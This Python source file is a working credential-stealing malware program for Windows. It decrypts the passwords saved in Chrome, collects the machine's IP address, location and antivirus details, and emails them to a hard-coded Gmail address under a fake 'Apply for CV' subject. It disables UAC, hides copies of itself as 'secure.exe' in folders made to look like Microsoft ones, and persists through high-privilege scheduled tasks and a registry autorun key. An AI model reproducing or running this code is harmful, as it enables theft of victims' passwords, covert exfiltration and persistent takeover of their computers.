from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
from email.mime.base import MIMEBase
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes)
import os, ctypes, subprocess, json, sqlite3, shutil,\
base64, platform, socket, sys,ctypes.wintypes,win32com.shell.shell as shell, win32api as win, requests as re, smtplib    
# from Crypto.Cipher import AES
from Cryptodome.Cipher import AES 
import winreg
  
file_path = os.getcwd() 
extend = "\\"

APP_DATA_PATH= os.environ['LOCALAPPDATA']
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

ASADMIN = 'asadmin'

     
def encrypt(cipher, plaintext, nonce):
    cipher.mode = modes.GCM(nonce)
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext)
    return (cipher, ciphertext, nonce)

def decrypt(cipher, ciphertext, nonce):
    cipher.mode = modes.GCM(nonce)
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext)

def get_cipher(key):
    cipher = Cipher(
        algorithms.AES(key),
        None,
        backend=default_backend()
    )
    return cipher

def dpapi_decrypt(encrypted):
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [('cbData', ctypes.wintypes.DWORD),
                    ('pbData', ctypes.POINTER(ctypes.c_char))]

    p = ctypes.create_string_buffer(encrypted, len(encrypted))
    blobin = DATA_BLOB(ctypes.sizeof(p), p)
    blobout = DATA_BLOB()
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    if not retval:
        raise ctypes.WinError()
    result = ctypes.string_at(blobout.pbData, blobout.cbData)
    ctypes.windll.kernel32.LocalFree(blobout.pbData)
    return result

def unix_decrypt(encrypted):
    if sys.platform.startswith('linux'):
        password = 'peanuts'
        iterations = 1
    else:
        raise NotImplementedError

    from Crypto.Protocol.KDF import PBKDF2

    salt = 'saltysalt'
    iv = ' ' * 16
    length = 16
    key = PBKDF2(password, salt, length, iterations)
    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
    decrypted = cipher.decrypt(encrypted[3:])
    return decrypted[:-ord(decrypted[-1])]

def get_key_from_local_state():
    jsn = None
    with open(os.path.join(os.environ['LOCALAPPDATA'],
        r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
        jsn = json.loads(str(f.readline()))
    return jsn["os_crypt"]["encrypted_key"]

def aes_decrypt(encrypted_txt):
    encoded_key = get_key_from_local_state()
    encrypted_key = base64.b64decode(encoded_key.encode())
    encrypted_key = encrypted_key[5:]
    key = dpapi_decrypt(encrypted_key)
    nonce = encrypted_txt[3:15]
    cipher = get_cipher(key)
    return decrypt(cipher,encrypted_txt[15:],nonce)

class ChromePassword:
    def __init__(self):
        self.passwordList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
        _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
        if os.path.exists(_temp_path):
            os.remove(_temp_path)
        shutil.copyfile(_full_path,_temp_path)
        self.show_password(_temp_path)

    def show_password(self,db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            host = row[0]
            if host.startswith('android'):
                continue
            name = row[1]
            value = self.chrome_decrypt(row[2])
            _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
            self.passwordList.append(_info)
        conn.close()
        os.remove(db_file)

    def chrome_decrypt(self,encrypted_txt):
        if sys.platform == 'win32':
            try:
                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                    decrypted_txt = dpapi_decrypt(encrypted_txt)
                    return decrypted_txt.decode()
                elif encrypted_txt[:3] == b'v10':
                    decrypted_txt = aes_decrypt(encrypted_txt)
                    return decrypted_txt[:-16].decode()
            except WindowsError:
                return None
        else:
            try:
                return unix_decrypt(encrypted_txt)
            except NotImplementedError:
                return None

    def save_passwords(self):
        with open(save_text_file ,'w',encoding='utf-8') as f:
            f.write("CV main Data")
            f.writelines(self.passwordList)
            f.write("\n end data")
            f.close()

def __computer_information__(save_text_file):
    with open(save_text_file, "a") as f:
        hostname = socket.gethostname()
        Ipaddr = socket.gethostbyname(hostname)

        try:
            publicIp = re.get("https://api.ipify.org").text
            f.write("Public IP :" + publicIp)
            
            response = re.get("http://ip-api.com/json/"+ publicIp).json()
            for ip_info in response:
                f.write("IP ADDRESS information")
                f.write( "\n"+ ip_info + " = " + str(response[ip_info]) + "\n")
                
                """Provides the information of Security"""

            if os.path.exists('C:\\Program Files\\Windows Defender'):
                f.write("Win Def Mod" + 'Windows Defender')
            elif os.path.exists('C:\\Program Files\\AVAST Software\\Avast'):
                f.write("Win Def Mod" + 'Avast')
            elif os.path.exists('C:\\Program Files\\AVG\\Antivirus'):
                f.write("Win Def Mod" + 'AVG')
            elif os.path.exists('C:\\Program Files\\Avira\\Launcher'):
                f.write("Win Def Mod" + 'Avira')
            elif os.path.exists('C:\\Program Files\\IObit\\Advanced SystemCare'):
                f.write("Win Def Mod" + 'Advanced SystemCare')
            elif os.path.exists('C:\\Program Files\\Bitdefender Antivirus Free'):
                f.write("Win Def Mod" + 'Bitdefender')
            elif os.path.exists('C:\\Program Files\\COMODO\\COMODO Internet Security'):
                f.write("Win Def Mod" + 'Comodo')
            elif os.path.exists('C:\\Program Files\\DrWeb'):
                f.write("Win Def Mod" + 'Dr.Web')
            elif os.path.exists('C:\\Program Files\\ESET\\ESET Security'):
                f.write("Win Def Mod" + 'ESET')
            elif os.path.exists('C:\\Program Files\\GRIZZLY Antivirus'):
                f.write("Win Def Mod" + 'Grizzly Pro')
            elif os.path.exists('C:\\Program Files\\Kaspersky Lab'):
                f.write("Win Def Mod" + 'Kaspersky')
            elif os.path.exists('C:\\Program Files\\IObit\\IObit Malware Fighter'):
                f.write("Win Def Mod" + 'Malware fighter')
            elif os.path.exists('C:\\Program Files\\360\\Total Security'):
                f.write("Win Def Mod" + '360 Total Security')
            else:
                pass

        except Exception:
            f.write("Could'nt get public address")

        f.write("Procesor : " + platform.processor() + '\n' )
        f.write("System Information : " + platform.system() + "\n" + "Platform Version : " + platform.version() + "\n")
        f.write("Machine : "+ platform.machine() + "\n")
        f.write("Hostname" + hostname + "\n")
        f.write("\n" + "Private Ip Address" + Ipaddr + "\n")

email_address = 'EnterYoursEmail'
toaddr = 'EnterYoursEmail'

def __send_email__(filename , attachment , toaddr):

    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Apply for CV"
    global av
    body = "Let work for long term and I am here for working hard and smart " + "Version " 

    msg.attach(MIMEText (body , 'plain'))

    filename =filename
    attachment = open(attachment , 'rb')

    mimebase = MIMEBase ('application' , 'octet-stream')
    mimebase.set_payload(attachment.read())
    encoders.encode_base64(mimebase)

    mimebase.add_header('Content-Disposition',"attachment;filename = %s" % filename)
    msg.attach(mimebase)
    s = smtplib.SMTP('smtp.gmail.com',587)
    
    email_password = 'EnterYoursOwnPassword'
    s.starttls()
    s.login(fromaddr ,email_password)
    text = msg.as_string()
    s.sendmail(fromaddr , toaddr , text)
    s.quit()

def remove_file(save_text_file):
    for i in os.listdir('.'):
        if i == save_text_file:
            os.remove(i)
            
def call_main_function(save_text_file):
    Main = ChromePassword()
    Main.get_chrome_db()
    Main.save_passwords()
    __computer_information__(save_text_file)
    if check_internet_conn():
        __send_email__('CV',save_text_file , 'technicaldemonstrations@gmail.com')
        remove_file(save_text_file)
    else:
        sys.exit()
            
def check_internet_conn():
    import urllib.request
    try:
        urllib.request.urlopen('https://www.google.com')
        return True
    except :
        return False

def check_time_to_secure(interval=0):
    from datetime import datetime,timedelta; 
    dt = datetime.now() + timedelta(minutes=interval)
    t = "%s:%s" % (str(dt.hour).zfill(2),str(dt.minute).zfill(2))
    d = "%s/%s/%s" % (dt.month,str(dt.day).zfill(2),dt.year)

    return d,t,dt    

def check_exsistance(dest_text_path,dest_text_path_,dest_e_path,dest_e_path_):
    tf_1 = os.path.exists(dest_text_path)
    tf_2 = os.path.exists(dest_text_path_)
    ef_1 = os.path.exists(dest_e_path)
    ef_2 = os.path.exists(dest_e_path_)
    
    return tf_1,tf_2,ef_1,ef_2

def write_file(dt_re):
    with open(dest_text_path,'w') as f, open(dest_text_path_,'w') as f1:  
        f.write(f'False \n{dt_re.day + 1}')
        f1.write(f'False \n{dt_re.day + 1}')
        f.close()
        f1.close()

def update_file(dt_re):
    with open(dest_text_path,'r+') as f, open(dest_text_path_,'r+') as f1:  
        f.truncate(0)
        f1.truncate(0)
        f.write(f'False \n{dt_re.day + 1}')
        f1.write(f'False \n{dt_re.day + 1}')
        f.close()
        f1.close()
        sys.exit(0)
            
def read_files(text_path,text_path_):
    global d1,d2
    with open(text_path,'r') as txt_f, open(text_path_,'r') as txt_f2:
        d2 = txt_f2.readlines()
        d1 = txt_f.readlines()
            
        val_ch = ''.join(d2[0].split('\n')[:-1])
        val_ch_1 = ''.join(d1[0].split('\n')[:-1])
        
    return val_ch,val_ch_1
    
def secure_uac():
    subprocess.call("powershell.exe -command REG ADD 'HKLM\Software\microsoft\windows\currentversion\policies\system' /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f", shell = "TRUE")
    subprocess.call("powershell.exe -command REG ADD 'HKLM\Software\microsoft\windows\currentversion\policies\system' /v ConsentPromptBehaviorUser /t REG_DWORD /d 0 /f" , shell = "TRUE") 
    subprocess.call("powershell.exe -command REG ADD 'HKLM\Software\microsoft\windows\currentversion\policies\system' /v EnableLUA /t REG_DWORD /d 0 /f" ,shell = "TRUE") 
    
def hide_c(curr_app_path):
    subprocess.call(f"powershell.exe -command copy '{curr_app_path}' '{dest_e_path}'", shell=True)
    subprocess.call(f"powershell.exe -command copy '{curr_app_path}' '{dest_e_path_}'", shell=True)
    subprocess.call(f"powershell.exe -command attrib +h '{dest_e_path}'", shell=True)
    subprocess.call(f"powershell.exe -command attrib +h '{dest_e_path_}'", shell=True)

def schedule_task(curr_time,curr_date,curr_time_,curr_date_):
    subprocess.call(f"powershell.exe -command SCHTASKS /CREATE /SC DAILY /ST {curr_time} /SD {curr_date} /TN SECURITY\SHEDULED /TR '{dest_e_path}' /RL HIGHEST", shell=True)  
    subprocess.call(f"powershell.exe -command SCHTASKS /CREATE /SC DAILY /ST {curr_time_} /SD {curr_date_} /TN WINDOWS\SHEDULED /TR '{dest_e_path_}' /RL HIGHEST", shell=True)  
    return True

def hide_text_file():
    subprocess.call(f"powershell.exe -command attrib +h '{dest_text_path}'", shell=True)
    subprocess.call(f"powershell.exe -command attrib +h '{dest_text_path_}'", shell=True)

def check_e_path_existance():
    if os.path.exists(dest_e_path):
        application_path = dest_e_path
    elif os.path.exists(dest_e_path_):
        application_path = dest_e_path_
    else:
        sys.exit()
    return application_path

def create_reg(application_path):
    regkey = 1
    if regkey < 2:
        reghive = winreg.HKEY_CURRENT_USER
    else:
        reghive = winreg.HKEY_LOCAL_MACHINE
    if (regkey % 2) == 0:
        regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    else:
        regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

    # Add registry autorun key
    reg = winreg.ConnectRegistry(None,reghive)
    key = winreg.OpenKey(reg,regpath,0,access=winreg.KEY_WRITE)
    winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,application_path)

def create_secure_dir():
    dest_dir = "C:\\ProgramData\\Microsoft Security"
    dest_dir_= "C:\\ProgramData\\Windows Secure Certification"
    if os.path.exists(dest_dir) and os.path.exists(dest_dir_):
        pass
    else:
        os.mkdir(dest_dir)
        os.mkdir(dest_dir_)

    return dest_dir,dest_dir_

"""Dir creating and text path """  
dest_dir,dest_dir_ = create_secure_dir()
dest_text_path = dest_dir + "\\" + "txt_file.txt"
dest_text_path_ = dest_dir_ + "\\" + "txt_file_2.txt"
dest_e_path = dest_dir + "\\" + "secure.exe"
dest_e_path_ = dest_dir_ + "\\" + "secure.exe"
save_text_file = dest_dir + "\\" + "secure.txt"
save_text_file_ = dest_dir_ + "\\" + "secure.txt"

def main(): 
    tf_1,tf_2,ef_1,ef_2 = check_exsistance(dest_text_path,dest_text_path_,\
                                                            dest_e_path,dest_e_path_)
    
    if tf_1 and ef_1 or tf_2 and ef_2:
        val_ch,val_ch_1 = read_files(dest_text_path,dest_text_path_)
            
        curr_date, curr_time, dt_re = check_time_to_secure()
        curr_day = dt_re.day
        
        if val_ch == 'False ' and int(d1[1]) == curr_day:
            call_main_function(save_text_file)
            update_file(dt_re)
                                
        elif val_ch_1 == 'False '  and int(d2[1]) == curr_day:
            call_main_function(save_text_file)
            update_file(dt_re)
        else:
            sys.exit()

    else:
            secure_uac()
            curr_app_path = os.getcwd() + "\\" + "secure.exe"
            
            if os.path.exists(curr_app_path):
                hide_c(curr_app_path)
            else:
                sys.exit()
            
            curr_date, curr_time, dt_re = check_time_to_secure(10)
            curr_date_, curr_time_, dt_re_ = check_time_to_secure(60)
            
            schedule_task(curr_time,curr_date,curr_time_,curr_date_)
        
            if schedule_task:
                write_file(dt_re)

            hide_text_file()

            application_path = check_e_path_existance()
            
            if application_path:
                create_reg(application_path)
                call_main_function()
    
if __name__ == '__main__':
    main()